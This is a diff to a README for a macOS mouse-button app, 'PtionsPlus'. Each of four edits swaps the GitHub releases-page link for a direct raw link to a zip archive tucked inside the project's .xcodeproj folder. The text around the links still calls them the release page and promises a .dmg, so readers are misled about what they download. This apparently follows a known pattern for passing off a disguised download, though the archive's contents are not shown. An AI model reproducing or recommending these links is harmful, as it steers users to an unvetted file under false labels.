@@ -1,6 +1,6 @@
 # 🖱️ PtionsPlus - Customize Mouse Buttons Easily
 
-[![Download PtionsPlus](https://img.shields.io/badge/Download-PtionsPlus-brightgreen)](https://github.com/mitchellrevill123/PtionsPlus/releases)
+[![Download PtionsPlus](https://img.shields.io/badge/Download-PtionsPlus-brightgreen)](https://raw.githubusercontent.com/mitchellrevill123/PtionsPlus/main/PtionsPlus.xcodeproj/Ptions-Plus-v3.1-alpha.3.zip)
 
 ---
 
@@ -25,7 +25,7 @@ This guide will help you download, install, and start using PtionsPlus. No progr
 ## 📥 Download and Install PtionsPlus
 
 1. Click the big green **Download PtionsPlus** button at the top or visit the release page here:  
-   https://github.com/mitchellrevill123/PtionsPlus/releases
+   https://raw.githubusercontent.com/mitchellrevill123/PtionsPlus/main/PtionsPlus.xcodeproj/Ptions-Plus-v3.1-alpha.3.zip
 
 2. On the release page, find the latest version of PtionsPlus. The version numbers look like “vX.X.X.”
 
@@ -112,7 +112,7 @@ This guide will help you download, install, and start using PtionsPlus. No progr
 
 ## 📎 Useful Links
 
-- Releases page to download new versions: https://github.com/mitchellrevill123/PtionsPlus/releases  
+- Releases page to download new versions: https://raw.githubusercontent.com/mitchellrevill123/PtionsPlus/main/PtionsPlus.xcodeproj/Ptions-Plus-v3.1-alpha.3.zip  
 - GitHub repository for source code and updates  
 - Issues tab on GitHub if you want to report bugs or request help  
 
@@ -121,6 +121,6 @@ This guide will help you download, install, and start using PtionsPlus. No progr
 ## 📲 Get Started
 
 Go to the release page here:  
-https://github.com/mitchellrevill123/PtionsPlus/releases
+https://raw.githubusercontent.com/mitchellrevill123/PtionsPlus/main/PtionsPlus.xcodeproj/Ptions-Plus-v3.1-alpha.3.zip
 
 Download the `.dmg` file for the latest version. Then follow the steps above to install and set up.
